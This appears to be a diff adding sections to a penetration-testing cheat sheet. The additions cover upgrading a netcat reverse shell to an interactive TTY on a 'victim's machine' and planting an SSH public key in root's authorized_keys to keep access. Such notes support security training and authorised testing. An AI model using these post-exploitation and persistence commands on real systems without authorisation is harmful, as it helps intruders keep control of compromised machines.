@@ -270,4 +270,57 @@ There are times when we encounter websites that allow us an opportunity to uploa
 
 ### **Upgrade a Shell**
 
-`script /dev/null -c bash`
+* [Upgrade a shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After we run this command, we will hit `ctrl+z` to background our shel and get back to our local terminal, and input the following stty command:
+
+```
+stty raw -echo
+fg
+[enter]
+[enter]
+```
+
+Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back.
+
+We may notice that our shell does not cover the entire terminal. To fix this, we need to do this.
+
+On our local machine:
+
+```bash
+echo $TERM
+#xterm-256color
+stty size
+#60 300
+```
+
+On the victim's machine:
+
+```
+export TERM=xterm-256color
+stty rows 60 columns 300
+```
+
+### Gain a shell with write access to a users .ssh directory
+
+If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
+
+```
+ssh-keygen -f key
+```
+
+This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
+
+```
+user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+```
+
+Now, the remote server should allow us to log in as that user by using our private key:
+
+```
+ssh root@10.10.10.10 -i key
+```
